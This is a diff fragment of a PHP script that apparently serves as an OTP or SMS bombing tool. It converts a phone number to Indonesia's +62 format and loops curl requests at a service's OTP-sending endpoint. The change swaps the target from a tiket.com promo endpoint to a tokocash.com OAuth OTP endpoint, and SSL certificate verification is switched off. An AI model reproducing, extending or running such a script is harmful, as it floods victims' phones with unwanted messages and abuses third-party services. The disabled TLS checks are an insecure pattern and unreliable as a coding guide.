@@ -21,7 +21,7 @@ echo "\n$blue+---------------------[# RESULT #]---------------------+\n";
 $no = '62'.substr(trim($no), 1);
 for ($x=1; $x<=$loop; $x++) {
 	$c = curl_init();
-	curl_setopt($c, CURLOPT_URL, "https://www.tiket.com/landing_page_promo/do_send_apps");
+	curl_setopt($c, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");
 	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
 	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
 	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
